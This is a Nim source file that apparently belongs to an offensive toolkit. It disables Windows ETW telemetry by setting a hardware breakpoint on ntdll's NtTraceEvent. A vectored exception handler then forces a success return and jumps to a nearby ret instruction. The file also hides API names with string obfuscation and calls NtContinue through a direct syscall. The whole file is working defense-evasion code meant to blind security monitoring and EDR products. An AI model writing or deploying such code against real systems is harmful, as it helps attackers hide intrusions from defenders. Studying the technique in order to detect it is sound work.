import static_strs
import nimvoke/dinvoke
import nimvoke/syscalls
from winim import NTSTATUS, FALSE, LONG, NULL, PVOID, ULONG, CONTEXT, CONTEXT_DEBUG_REGISTERS, PCONTEXT, PVECTORED_EXCEPTION_HANDLER, 
                  EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, STATUS_SINGLE_STEP, PEXCEPTION_POINTERS, GetModuleHandleA, GetProcAddress, `&`

# reference: https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/

var 
  gNtTraceEventAddr: pointer
  gVEH: PVOID

dinvokeDefine(RtlCaptureContext, "ntdll.dll", proc (ContextRecord: PCONTEXT) {.stdcall.})
dinvokeDefine(RemoveVectoredExceptionHandler, "kernel32.dll", proc (Handle: PVOID): ULONG {.stdcall.})
dinvokeDefine(AddVectoredExceptionHandler, "kernel32.dll", proc (First: ULONG, Handler: PVECTORED_EXCEPTION_HANDLER): PVOID {.stdcall.})

proc obtRetGad(startAddr: pointer, maxDistance: int): pointer =
  let base = cast[int](startAddr)
  for i in 0 ..< maxDistance:
    let current = cast[ptr byte](base + i)
    if current[] == 0xC3: 
      return cast[pointer](current)
  return nil

proc cEHandler(ExceptionInfo: PEXCEPTION_POINTERS): LONG {.stdcall.} =
  if ExceptionInfo.ExceptionRecord.ExceptionCode == STATUS_SINGLE_STEP:
    
    # Check for the correct breakpoint on NtTraceEvent
    if cast[int](ExceptionInfo.ExceptionRecord.ExceptionAddress) == cast[int](gNtTraceEventAddr):
      
      # Find ret gadget nearby
      let retGadget = obtRetGad(gNtTraceEventAddr, 1000)
      if not retGadget.isNil:
        # Set return value to STATUS_SUCCESS
        ExceptionInfo.ContextRecord.Rax = 0  
        
        # Redirect execution to ret instruction
        ExceptionInfo.ContextRecord.Rip = cast[int](retGadget)
        
        # Set resume flag to continue execution
        ExceptionInfo.ContextRecord.EFlags = ExceptionInfo.ContextRecord.EFlags or (1 shl 16)
  
        return EXCEPTION_CONTINUE_EXECUTION
      else:
        ExceptionInfo.ContextRecord.Rax = 0
        ExceptionInfo.ContextRecord.Rip = ExceptionInfo.ContextRecord.Rip + 2
        return EXCEPTION_CONTINUE_EXECUTION
    
  return EXCEPTION_CONTINUE_SEARCH

proc setHWBPForNTTE*(): bool =
  let ntdll = GetModuleHandleA(jam("ntdll"))
  gNtTraceEventAddr = GetProcAddress(ntdll, jam("NtTraceEvent"))
  if gNtTraceEventAddr == NULL:
    return false 

  gVEH = AddVectoredExceptionHandler(1, cEHandler)
  if gVEH == NULL:
    return false

  var ctx: CONTEXT
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
 
  RtlCaptureContext(&ctx)

  # Setup on NtTraceEvent
  ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
  ctx.Dr0 = cast[int](gNtTraceEventAddr)
  
  # Config Dr7 for execution breakpoint on Dr0
  ctx.Dr7 = ctx.Dr7 or (1 shl 0)        # L0 = 1 (enable breakpoint 0)
  ctx.Dr7 = ctx.Dr7 and not (3 shl 16)  # LEN0 = 00 (1 byte length)
  ctx.Dr7 = ctx.Dr7 and not (3 shl 18)  # RW0 = 00 (execute)

  # Apply new context with breakpoint using NtContinue
  let status = syscall(NtContinue, &ctx, FALSE)
  if status != 0:
    discard RemoveVectoredExceptionHandler(gVEH)
    return false

  return true